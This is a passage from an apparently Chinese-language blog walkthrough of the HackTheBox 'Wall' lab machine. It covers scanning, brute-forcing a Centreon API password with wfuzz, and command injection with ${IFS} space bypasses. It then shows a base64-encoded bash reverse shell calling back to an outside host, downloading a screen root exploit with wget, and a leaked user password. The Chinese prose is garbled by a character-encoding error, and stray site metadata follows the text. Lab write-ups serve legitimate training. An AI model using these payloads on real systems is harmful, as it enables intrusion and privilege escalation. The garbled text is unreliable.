ä¹‹åå°±æ˜¯é¢å¯¹hacktheboxä¸Šä¸€ä¼—é¶æœºçš„å¸¸è§„å¥—è·¯ï¼šä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æï¼ˆè¿™åº”è¯¥ä¹Ÿæ˜¯æ­£å¸¸æ¸—é€è¿‡ç¨‹ä¸­çš„ç¬¬ä¸€æ­¥ï¼‰ 1namp -sC -sV -oA namp&#x2F;wall 10.10.10.157 æˆ‘å­¦ä¹ äº†ä¸‹é‚£ä½youtuberçš„å¥½ä¹ æƒ¯ï¼Œè¿™é‡Œnampä¸ä»…åšäº†æ‰«æï¼ŒåŒæ—¶è¿˜ä¿å­˜ä¸ºæ–‡ä»¶æ–¹ä¾¿å›é¡¾ã€‚ ä¹‹åå‘ç°å¼€æ”¾äº†ä¸¤ä¸ªç«¯å£ï¼Œ80ä¸22,ä¹Ÿå°±æ˜¯httpä¸sshå¯¹åº”æœåŠ¡ã€‚å°è¯•ç›´æ¥è®¿é—®ï¼Œä¹Ÿå¾—åˆ°äº†apacheçš„é»˜è®¤é¡µé¢ã€‚åŸºäºsshå¹¶æ— å¤ªå¤šåˆ©ç”¨ä¹‹å¤„ï¼Œå¯ä»¥ç›´æ¥ä»webé¡µé¢ä¸‹æ‰‹ã€‚é‚£ä¹ˆå…ˆæ‰«ä¸‹ç›®å½•ï¼Œæ¥çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯èƒ½æœ‰è¶£çš„,åœ¨ç®€å•çš„FUZZä¸€ä¸‹robots.txt,.htacesséƒ½æ— ç»“æœåï¼Œæœæ–­ä½¿ç”¨gobusterï¼š 1gobuster dir -u http:&#x2F;&#x2F;10.10.10.157&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt æ‰«åˆ°äº†ä¸€ä¸ª/monitoringï¼Œå°è¯•è®¿é—®ï¼Œå´å‘ç°æç¤ºunauthorizedã€‚å¹¶æç¤ºè¾“å…¥ç”¨æˆ·å¯†ç ï¼Œå°è¯•ä¸‹admin-admin,admin-password,guest-guestç­‰ç­‰å¯èƒ½çš„å¼±å£ä»¤æ— æœï¼Œäºæ˜¯å¾—å¦è¾Ÿè¹Šå¾„ã€‚é¡ºä¾¿è¡¥ä¸€ä¸‹webAPIä¸­authorizeè·Ÿauthenticationçš„åŒºåˆ«ï¼š 123èº«ä»½éªŒè¯ï¼ˆAuthenticationï¼‰ï¼šç¡®å®šç”¨æˆ·æ˜¯è°ã€‚æˆæƒ(Authorization)ï¼šç¡®å®šç”¨æˆ·èƒ½åšä»€ä¹ˆï¼Œä¸èƒ½åšä»€ä¹ˆã€‚ è¿™é‡Œä»dalaoé‚£å­¦åˆ°äº†ä¸€æ‹›ï¼šæŠ“åŒ…åï¼Œå½“ä»¥GETæ–¹å¼è®¿é—®/monitoringæ—¶ï¼Œæˆ‘ä»¬å¾—åˆ°çš„æ˜¯401 unauthorized,ä½†å¦‚æœä»¥POSTæ–¹å¼è®¿é—®ï¼Œå°±ä¼šçš„åˆ°é¡µé¢æç¤ºï¼Œå¹¶æ‹¿åˆ°åç»­æ“ä½œçš„é¡µé¢ç›®å½• /centreon å†åº¦è®¿é—®ï¼Œç»ˆäºå¾—åˆ°ä¸€ä¸ªcentreonçš„ç™»å½•ç•Œé¢ï¼ŒåŒæ—¶ç‰ˆæœ¬ä¸º19.04.0é‚£ä¹ˆé—®é¢˜å°±å›åˆ°ç”¨æˆ·å¯†ç ä¸Šäº†ã€‚ä¸ºäº†èƒ½äº†è§£è¿™ä¸€ç³»ç»Ÿï¼Œå½“ç„¶éœ€è¦è°·æ­Œäº†è§£ä¸‹centreonåˆ°åº•ä¸ºä½•ç‰©ï¼Œä»¥åŠæœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ã€‚å¾ˆå¿«å°±å¯ä»¥å‘ç°ï¼Œè¿™ä¸€ç‰ˆæœ¬å­˜åœ¨æœ‰sqlæ³¨å…¥ï¼ŒRCEå‘½ä»¤æ‰§è¡Œç­‰ç­‰æ¼æ´ï¼›æˆ–è€…ä½¿ç”¨kaliä¸Šçš„searchspolit centreon```12å‘ç°æœ‰RCEç­‰ç­‰æ¼æ´ä»¥åŠåˆ©ç”¨ï¼Œæˆ‘ä»¬å¯¹RCEgetshellç›¸å¯¹æ¯”è¾ƒè½»æ¾ï¼Œé‚£ä¹ˆå°±ä¸å¦¨çœ‹çœ‹RCEçš„åˆ©ç”¨&#96;&#96;&#96; searchsploit -x &quot;æ­¤å¤„æ¥åˆ©ç”¨çš„è„šæœ¬æ–‡ä»¶åœ°å€&quot; ä»”ç»†å®¡è¿‡åå‘ç°ï¼Œä»ä¸Šé¢æåˆ°çš„ç§ç§æ¼æ´åˆ°ç°åœ¨å…·ä½“çš„RCEï¼Œæˆ‘ä»¬éƒ½éœ€è¦åœ¨autheticatedçš„å‰æä¸‹åˆ©ç”¨ï¼Œé‚£ä¹ˆè¿˜æ˜¯å¾—ä»ç™»é™†ç•Œé¢çš„ç”¨æˆ·å¯†ç ä¸‹æ‰‹ã€‚ è¿™é‡Œåˆä»å¤§ä½¬é‚£å­¦åˆ°äº†ç¬¬äºŒæ‹›ï¼šåœ¨ç™»å½•ç•Œé¢éšä¾¿è¾“å…¥å°è¯•ç™»å½•å¹¶æŠ“åŒ…æ—¶ï¼Œä¼šå‘ç°burpæŠ“åŒ…å¾—å†…å®¹é™¤äº†admin,passwordå‚æ•°ï¼Œè¿˜ä¼šæœ‰centreonè‡ªå¸¦çš„tokenã€‚è¿™å°±ç»™æˆ‘ä»¬çš„æš´åŠ›ç ´è§£å¯èƒ½æ€§ç”»ä¸Šäº†å¥å·ã€‚é‚£ä¹ˆè¿˜æœ‰å…¶ä»–æ–¹æ³•çˆ†ç ´å—ï¼Ÿæœ‰çš„ï¼Œé€šè¿‡APIæ¥å°è¯•ï¼š googleåå‘ç°ç¡®å®å­˜åœ¨centreonçš„api,è€Œä¸”ç¡®å®åªä¼ äº†username,passwordä¸¤ä¸ªå‚æ•°ï¼Œæ˜¯å¯ä»¥çˆ†ç ´çš„ã€‚ä¹‹åç»§ç»­FUZZï¼Œäºæ˜¯å‡†å¤‡postè®¿é—®ï¼š 1&#x2F;centreon&#x2F;api&#x2F;index.php?action&#x3D;authenticate å¹¶é¡ºä¾¿ä¼ å‚admin=admin&amp;password=passowrdã€‚å‘ç°è¿”å›bad crendentialsã€‚å¹¶ä¸”æ”¹æ‰usernameå‚æ•°æ—¶è¿”å›çš„æ˜¯ä¸€è‡´çš„ï¼Œè¿™æ ·å°±ä¸å¥½é€šè¿‡responseæ¥çˆ†ç ´ã€‚é‚£åªèƒ½çŒœæµ‹ç”¨æˆ·åæ˜¯adminäº†ã€‚ 1wfuzz http:&#x2F;&#x2F;10.10.10.157&#x2F;centreon&#x2F;api&#x2F;index.php?action&#x3D;authenticate -w &#x2F;usr&#x2F;share&#x2F;seclist&#x2F;Passwords&#x2F;darkweb2017-top1000.txt -d &quot;username&#x3D;admin&amp;password&#x3D;FUZZ&quot; --hc 403 â€“hc å¯ä»¥ç­›æ‰è¿”å›403çš„ç»“æœã€‚ä¸Šé¢ç”¨çš„è¿™ä¸ªå­—å…¸æˆ‘å¥½åƒkaliä¸Šå¹¶æ²¡æœ‰ï¼Œåªèƒ½è‡ªå·±æ‰¾å­—å…¸ç”¨äº†ã€‚å¾ˆå¿«å¾—åˆ°æ­£ç¡®çš„å¯†ç  password1â€¦â€¦è¿™ä¸ªå¼±å£ä»¤çœŸçš„æ˜¯å¼ºï¼Œç®€å•å½’ç®€å•ï¼Œæ€»å½’äººæ‰‹FUZZåº”è¯¥ä¸å¤ªèƒ½FUZZå‡ºæ¥â€¦â€¦ ä¹‹åå°±æˆåŠŸç™»é™†ï¼Œè½®åˆ°æˆ‘ä»¬å¤§å±•èº«æ‰‹äº†ã€‚åœ¨ç½‘ä¸Šå¯ä»¥æŸ¥åˆ°å¾ˆå¤šç§åˆ©ç”¨ï¼Œæˆ‘å‚è€ƒäº†dalaoçš„é‚£ç§å‘½ä»¤æ‰§è¡Œï¼ˆåƒè¿™ç§æ§åˆ¶å°é‡Œçš„ç¡®å­˜åœ¨å¾ˆå¤šå¯ä»¥æ³¨å…¥åˆ©ç”¨çš„åœ°æ–¹ï¼‰åœ¨centreonçš„configurationä¸­å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ,ç®€å•è¯•ä¸‹ 1ping -c 1 127.0.0.1; linuxçš„pingè²Œä¼¼ä¸windowsæœ‰åŒºåˆ«ã€‚ç„¶è€Œåœ¨å‘½ä»¤æ‰§è¡Œæ—¶å¤±è´¥äº†å¹¶è¿”å›403ã€‚ç»§ç»­å°è¯•å…¶ä»–çš„å‘ç°å¯èƒ½æ˜¯è¿‡æ»¤äº†ç©ºæ ¼ã€‚äºæ˜¯ä½¿ç”¨å¸¸è§çš„ä¸€ç§ç»•è¿‡æ‰‹æ®µï¼š${IFS}ç»•è¿‡ç©ºæ ¼ã€‚å¦å¤–ï¼Œæˆ‘è¿˜å­¦åˆ°äº†æœ‰åˆ«äºè‡ªå·±åŸæ¥åƒåœ¾çš„æŠŠç©ºæ ¼ä¸€ä¸ªä¸ªæ¢æˆ${IFS}çš„æ‰‹æ®µã€‚ç›´æ¥åœ¨linuxå‘½ä»¤è¡Œä¸­ 1echo &#39;ping -c 1 127.0.0.1;&#39;|sed &#39;s&#x2F; &#x2F;$&#123;IFS&#125;&#x2F;g&#39; å°±å¾—åˆ°äº†payload ,å†åº¦æ”¾åœ¨åˆšåˆšçš„å‘½ä»¤æ‰§è¡Œç©ºæ ¼ä¸­ï¼Œä¿å­˜ï¼Œå¹¶export configurationä»¥æ‰§è¡Œå‘½ä»¤ã€‚å‘ç°æˆåŠŸäº†ã€‚æ—¢ç„¶æµ‹è¯•å¥½äº†ï¼Œé‚£æˆ‘ä»¬å°±ç›´æ¥getshellå§ã€‚åŸpayload: 1bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.3&#x2F;8888 0&gt;&amp;1&#39; è¿™é‡Œbash -c æ˜¯ç›´æ¥å°†åé¢çš„å­—ç¬¦ä¸²å†…å®¹æ‰§è¡Œå‘½ä»¤ã€‚è€Œåé¢bash -iç­‰ç­‰å°±æ˜¯bashåå¼¹shellçš„å‘½ä»¤äº†ã€‚(è¿™é‡Œè‡ªå·±å…¶å®è‡ªå­¦äº†å¥½ä¹…ï¼Œä¹ŸæŠ˜è…¾äº†ä¸æ™’æ—¶é—´æ‰æˆåŠŸåœ¨kaliä¸Šæ‹¿åˆ°è‡ªå·±çš„ä¸€å°å…¬ç½‘vpsçš„shellï¼Œä¹‹åå¦‚æœå†™å­¦ä¹ ç¬”è®°å†è¯¦ç»†è§£é‡Šç†è§£ä¸‹)è¿™é‡Œä¸å¦¨ç”¨base64ç¼–ç ä¸‹ç»•æ£€æŸ¥,æˆ‘ä¹Ÿä¸è®°å¾—è¿™é‡Œä¸ç”¨base64ç¼–ç æ˜¯å¦ä¼šäº§ç”Ÿè¢«è¿‡æ»¤bashçš„é—®é¢˜ï¼Œä½†æ¯•ç«Ÿbashæ˜¯é«˜å±å‘½ä»¤ï¼Œè¿˜æ˜¯æ‰§è¡Œç¼–ç ä¸ºå¦™ã€‚ 1echo &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.3&#x2F;8888 0&gt;&amp;1&#39; &quot;|base 64 å¾—åˆ°ï¼š 1YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D; é‚£ä¹ˆç»•è¿‡ç©ºæ ¼ï¼š 1echo &quot;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D; | base4 -d | bash&quot; |sed &#39;s&#x2F; &#x2F;$&#123;IFS&#125;&#x2F;g&#39; ç°payload: 1echo$&#123;IFS&#125;YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzg4ODggMD4mMSc&#x3D;$&#123;IFS&#125;|$&#123;IFS&#125;base4$&#123;IFS&#125;-d$&#123;IFS&#125;|$&#123;IFS&#125;bash; è®°å¾—æœ€åè¦æœ‰åˆ†å·ã€‚ä¹‹ååœ¨è‡ªå·±kaliä¸Šç›‘å¬8888ç«¯å£ï¼š 1nc -lvp 8888 å‘½ä»¤æ‰§è¡Œå³å¯getshellã€‚ æ‹¿ user æƒé™hacktheboxçš„é¶æœºæ‹¿ä¸‹ï¼Œå¹¶ä¸åªæ˜¯ç®€å•çš„getshell,è€Œæ˜¯è¦åˆ†åˆ«æ‹¿åˆ°rootæƒé™ä¸useræƒé™ä¸‹çš„ä¸¤ä¸ªæ–‡ä»¶ä¸­çš„flagæäº¤æ‰ç®—æˆåŠŸã€‚è¿™é‡Œè‡ªå·±å› ä¸ºæ²¡ä»€ä¹ˆææƒç»éªŒï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šå‚è€ƒäº†ä¸å°‘wpä¸è§†é¢‘æ‰ç®—æˆåŠŸã€‚å…ˆä»ç®€å•çš„userå¼€å§‹ï¼š 1ls -la å‘ç°useræœ‰shelbyä¸sysmonitorä¸¤ä¸ªã€‚æ‰¾ä¸€ä¸‹shelbyçš„å†…å®¹åå‘ç°åªæœ‰shelbyæœ‰æƒé™è¯»user.txtå³flagã€‚ç»è¿‡ä¸€ç•ªæŒ–æ˜ï¼Œå¯ä»¥å‘ç°èƒ½å¤Ÿæ‰¾åˆ°/opt/.shelby/backupè¿™ä¸€æ–‡ä»¶ã€‚file backupåå‘ç°æ˜¯ä¸€ä¸ªpythonç¼–è¯‘æ–‡ä»¶ï¼Œå¯èƒ½å°±æ˜¯pycå§ã€‚æ‰§è¡Œä¸‹python backupè¿™æ—¶æˆ‘ä»¬å¦‚æœå†ls -laï¼Œå°±ä¼šå‘ç°æˆ‘ä»¬ä¸çŸ¥æ€ä¹ˆå·²ç»å®Œæˆäº†authenticationã€‚è¿›å…¥ç›®å½•ã€‚ 1base64 backup å°†ç»“æœåœ¨æœ¬æœºçš„vimä¿å­˜ä¸ºbackup.pyc.b64ï¼Œå†base64è§£ç ï¼Œè¿™æ ·è¿™æ ·ä¸€ä¸ªpycæ–‡ä»¶å°±ç®—åˆ°äº†æœ¬æœºäº†ã€‚ç„¶åæˆ‘ä»¬ç”¨python çš„uncompyleåº“åç¼–è¯‘ä¸€ä¸‹ã€‚è¿˜åŸäº†pyæ–‡ä»¶ã€‚ä»å…¶ä¸­ç›´æ¥æ‹¿åˆ°shelby çš„å¯†ç  ShelbyPassw@rdIsStrong!sshç™»å½•shelbyå³å¯è¯»user.txtã€‚ æ‹¿ root æƒé™æ‹¿rootæƒé™æ—¶æˆ‘å°±æ¯”è¾ƒå°´å°¬äº†ï¼Œå› ä¸ºè¿™é‡Œrootçš„payloadå¯ä»¥ç›´æ¥æ‹¿åˆ°rootè·ŸshelbyäºŒè€…çš„æƒé™ã€‚å‚è€ƒäº†ä¸€ä¸ªè§£æ³•ï¼š /bin/screen-4.5.0For this exact version there is a vulnerability that allows to escalate to root è¿™é‡Œ/binä¸‹çš„screenç‰ˆæœ¬å…è®¸æˆ‘ä»¬ç›´æ¥åˆ©ç”¨æ¼æ´æ‹¿åˆ°rootæƒé™ã€‚payloadåœ¨æ­¤ï¼šhttps://github.com/XiphosResearch/exploits/tree/master/screen2rooté‚£æ¥ä¸‹æ¥åªç”¨æŠŠè„šæœ¬æ”¾åˆ°æˆ‘ä»¬æ‹¿åˆ°shellçš„æœºå­æ‰§è¡Œscreenroot.shå³å¯ã€‚é‚£ä¹ˆå¦‚ä½•ä¼ è¾“æ–‡ä»¶å‘¢ï¼Ÿè¿™é‡Œè¿ç”¨åˆ°äº†pythonå¼ºå¤§çš„åŠŸèƒ½ï¼Œä¹Ÿæ˜¯è‡ªå·±ä¹‹å‰æ›¾ç”¨è¿‡çš„SimpleHTTPServer 1python -m SimpliHTTPServer è¿™æ ·å°±é»˜è®¤ç›‘å¬8000ç«¯å£äº†ï¼Œå…ˆæŠŠè„šæœ¬æ”¾åœ¨æ ¹ç›®å½•ã€‚å°è¯•curl 10.10.14.3:8000/screenroot.shå¤±è´¥,æ²¡æœ‰å®‰è£…curlã€‚å†å°è¯•wget 10.10.14.3:8000/screenroot.shæˆåŠŸï¼Œåœ¨é¶æœºshellæ‹¿åˆ°è„šæœ¬ã€‚ 1bash screenroot.sh è¿è¡ŒæˆåŠŸï¼Œè¿›å…¥shellçš„äº¤äº’é¡µé¢ã€‚cat /root/root.txtå³å¯ï¼Œè¿˜å¯ä»¥cat /home/shelby/user.txtæ‹¿åˆ°ä¹‹å‰çš„userflagã€‚ å¤§æŠµå¦‚æ­¤å§ã€‚å½“æ—¶å³ä½¿åœ¨å‚è€ƒï¼Œè‡ªå·±ä¹ŸèŠ±äº†ä¸å°‘æ—¶é—´åœ¨getshellåçš„ææƒä¸Šï¼Œçœ‹æ¥è‡ªå·±è¿˜è¦å†å¤šåŠ äº†è§£å­¦ä¹ å‘€ã€‚å¯’å‡å·²ç»å¼€å§‹ï¼Œæˆ‘ä¹Ÿäº‰å–å†æ‹¼ä¸€æŠŠï¼Œå¤šå­¦ä¸€äº›webæ–¹é¢çš„çŸ¥è¯†å§ã€‚","categories":[],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"}]}],"categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"Node.js","slug":"Node-js","permalink":"https://www.bycsec.top/tags/Node-js/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"},{"name":"Java","slug":"Java","permalink":"https://www.bycsec.top/tags/Java/"},{"name":"Go","slug":"Go","permalink":"https://www.bycsec.top/tags/Go/"},{"name":"redis","slug":"redis","permalink":"https://www.bycsec.top/tags/redis/"},{"name":"PHP","slug":"PHP","permalink":"https://www.bycsec.top/tags/PHP/"},{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"Linux","slug":"Linux","permalink":"https://www.bycsec.top/tags/Linux/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"},{"name":"javascript","slug":"javascript","permalink":"https://www.bycsec.top/tags/javascript/"},{"name":"windows","slug":"windows","permalink":"https://www.bycsec.top/tags/windows/"}]}